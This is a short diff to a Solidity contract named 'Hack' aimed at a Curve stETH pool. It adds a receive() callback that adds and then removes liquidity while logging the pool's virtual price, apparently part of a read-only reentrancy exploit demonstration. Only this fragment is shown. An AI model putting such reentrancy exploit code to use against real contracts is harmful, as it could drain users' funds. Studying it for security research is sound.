@@ -12,5 +12,16 @@ contract Hack {
     ICurve private constant pool = ICurve(STETH_POOL);
     IERC20 private constant lpToken = IERC20(LP);
 
+    receive() external payable {
+        uint[2] memory amounts = [msg.value, 0];
+        uint lp = pool.add_liquidity{value: msg.value}(amounts, 1);
+        console.log(
+            "Before remove LP - vitural price:",
+            pool.get_virtual_price()
+        );
+        uint[2] memory min_amounts = [uint(0), uint(0)];
+        pool.remove_liquidity(lp, min_amounts);
+    }
+
     function pwn() external payable {}
 }
